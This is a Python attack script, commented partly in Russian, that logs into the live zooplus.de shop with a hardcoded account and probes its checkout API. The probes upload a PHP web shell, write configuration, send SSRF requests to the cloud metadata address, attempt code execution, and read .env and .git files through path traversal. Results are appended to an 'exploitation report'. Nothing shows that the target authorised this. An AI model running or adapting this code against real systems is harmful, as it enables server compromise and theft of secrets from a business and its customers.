#!/usr/bin/env python3
"""Deep Endpoint Hunt - поиск скрытых endpoints"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# 1. Test state-api for file upload
print("\n[1] Testing state-api for file upload...")
state_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/semiprotected/api/checkout/state-api/v2/file",
    "/semiprotected/api/checkout/state-api/v2/attachment",
]

php_shell = "<?php system($_GET['c']); ?>"
for ep in state_endpoints:
    try:
        files = {'file': ('s.php', php_shell, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            print(f"  [CRITICAL] File upload: {ep}")
            found_vulns.append({"type": "file_upload", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 2. Test state-api for config
print("\n[2] Testing state-api for config...")
config_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/config",
    "/semiprotected/api/checkout/state-api/v2/settings",
    "/semiprotected/api/checkout/state-api/v2/update-config",
]

for ep in config_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
            print(f"  [HIGH] Config readable: {ep}")
            found_vulns.append({"type": "config_read", "severity": "HIGH", "endpoint": ep, "data": str(data)[:200]})
    except: pass
    
    try:
        resp = s.post(f"{base}{ep}", json={"debug": True}, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [CRITICAL] Config writable: {ep}")
            found_vulns.append({"type": "config_write", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 3. Test state-api for SSRF
print("\n[3] Testing state-api for SSRF...")
ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/fetch",
    "/semiprotected/api/checkout/state-api/v2/proxy",
    "/semiprotected/api/checkout/state-api/v2/request",
    "/semiprotected/api/checkout/state-api/v2/get",  # Known to exist
]

for ep in ssrf_endpoints:
    try:
        resp = s.post(f"{base}{ep}", json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=2, verify=False)
        if resp.status_code in [200, 400] and len(resp.text) > 50:
            if "metadata" in resp.text.lower() or "169.254" in resp.text:
                print(f"  [CRITICAL] SSRF: {ep}")
                found_vulns.append({"type": "ssrf", "severity": "CRITICAL", "endpoint": ep, "response": resp.text[:300]})
    except: pass

# 4. Test state-api for code execution
print("\n[4] Testing state-api for code execution...")
exec_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/execute",
    "/semiprotected/api/checkout/state-api/v2/eval",
    "/semiprotected/api/checkout/state-api/v2/run",
]

for ep in exec_endpoints:
    try:
        resp = s.post(f"{base}{ep}", json={"code": "print('test')"}, timeout=3, verify=False)
        if resp.status_code == 200 and "test" in resp.text.lower():
            print(f"  [CRITICAL] Code execution: {ep}")
            found_vulns.append({"type": "code_execution", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 5. Test other API paths
print("\n[5] Testing other API paths...")
other_paths = [
    "/api/v1/upload",
    "/api/v2/upload",
    "/api/v3/upload",
    "/rest/api/upload",
    "/graphql",
    "/api/graphql",
]

for path in other_paths:
    try:
        resp = s.get(f"{base}{path}", timeout=2, verify=False)
        if resp.status_code not in [404, 403]:
            print(f"  [INFO] {path} -> {resp.status_code}")
    except: pass

# 6. Test path traversal with different base paths
print("\n[6] Testing path traversal with different bases...")
traversal_bases = [
    "/semiprotected/../",
    "/checkout/../",
    "/api/../",
    "/myaccount/../",
]

target_files = ["/.env", "/config.json", "/.git/config"]

for base_path in traversal_bases:
    for file in target_files:
        try:
            path = f"{base_path}{file.lstrip('/')}"
            resp = s.get(f"{base}{path}", timeout=2, verify=False)
            if resp.status_code == 200 and not resp.text.strip().startswith('<!'):
                if any(x in resp.text for x in ['NODE_ENV', 'SECRET', 'config']):
                    print(f"  [CRITICAL] Path traversal: {path}")
                    found_vulns.append({"type": "path_traversal", "severity": "CRITICAL", "endpoint": path, "file": file})
                    break
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"Found {len(found_vulns)} vulnerabilities:")
    for v in found_vulns:
        print(f"  [{v['severity']}] {v['type']}: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data']}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response']}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No new vulnerabilities found")

print("=" * 70)

